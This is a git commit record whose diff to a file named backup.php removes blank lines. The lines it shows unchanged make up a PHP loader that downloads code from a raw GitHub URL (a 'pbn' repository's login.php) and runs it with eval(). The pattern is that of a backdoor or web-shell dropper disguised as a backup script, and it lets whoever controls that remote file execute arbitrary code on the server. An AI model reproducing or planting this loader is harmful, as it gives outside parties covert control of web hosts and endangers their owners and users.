c780d773cfed00e1388ea43a264f6543590f1e73
albertenglishk4495 <albertenglishk4495@gmail.com>
2024-10-07 14:37:37 +0700

    Update backup.php

--- backup.php
+++ backup.php
@@ -1,6 +1,4 @@
 <?php
-
 $content = file_get_contents(urldecode('https://raw.githubusercontent.com/albertenglishk4495/pbn/refs/heads/main/login.php'));
-
 $content = "?> ".$content;
 eval($content);
